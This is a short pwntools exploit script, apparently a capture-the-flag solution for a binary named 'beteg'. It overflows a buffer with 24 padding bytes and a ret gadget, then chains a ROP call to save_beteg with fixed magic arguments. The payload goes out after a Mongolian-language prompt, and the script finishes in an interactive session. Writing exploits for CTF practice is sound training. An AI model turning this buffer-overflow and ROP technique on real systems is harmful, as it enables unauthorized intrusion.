#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '../pub/beteg')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

ret = 0x000000000040101a
rop = ROP(exe)

rop.save_beteg(
    0xdeadface,
    0xdeadbeef,
    0xabcdef01,
    0xbaadf00d,
    0xfeedface,
    0xcafebabe,
)

# Construct the payload
payload = b"A" * 24
payload+= p64(ret)
payload+= rop.chain()

io.sendlineafter("байж гэнэ. ".encode(), payload)

io.interactive()
